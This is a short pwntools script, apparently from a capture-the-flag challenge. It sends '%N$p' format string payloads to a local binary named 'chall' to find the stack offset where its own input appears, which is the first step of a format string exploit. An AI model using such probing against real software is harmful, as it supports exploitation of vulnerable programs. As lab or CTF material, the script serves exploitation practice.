# non-gojek method

from pwn import *

for i in range(1, 500):
    p = process('./chall', level='error')
    p.clean()
    p.sendline(f'%{i}$p')
    a = p.recvline().strip()
    try:
        a = int(bytes.decode(a, 'utf-8'), 16)
    except:
        print(f'{i}: {a}')
    else:
        if b'%' in p64(a) and b'$' in p64(a) and bytes(str(i), 'utf-8') in p64(a):
            print(f'{i}: {hex(a)}')
            print('Offset found ^^')
        else:
            print(f'{i}: {hex(a)}')

    p.close()
